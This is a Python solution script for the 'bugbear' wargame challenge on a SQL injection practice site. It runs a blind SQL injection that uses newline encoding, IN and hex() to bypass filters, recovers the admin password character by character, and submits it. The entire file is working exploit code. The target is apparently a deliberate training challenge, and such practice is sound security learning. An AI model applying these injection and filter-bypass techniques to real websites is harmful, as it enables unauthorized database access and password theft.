#!/usr/bin/env python3

'''
# Summary
- we can use IN instead of =
- we can use hex() to bypass the single quote filter
'''


import requests
import string

header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
pw_len = 1

# find pw length
while True:
    data = "?no=1%0a||%0aid%0ain%0a(\"admin\")%0a%26%26%0alength(pw)%0ain%0a({})%23".format(str(pw_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(pw_len))
    pw_len += 1
print("[+] Get pw Length : " + str(pw_len))

# find pw
for idx in range(1, pw_len + 1):
    for i in string_data:
        data = "?no=1%0a||%0aid%0ain%0a(\"admin\")%0a%26%26%0ahex(mid(pw,{},1))%0ain%0a(hex({}))%23".format(idx,ord(i))
        print(data)
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            pw = pw + i
            print("[*] Finding... : " + pw)
            break
print("[+] Found pw : " + pw)

payload = "?pw="+pw

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    if end.find("admin") != -1:
        end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")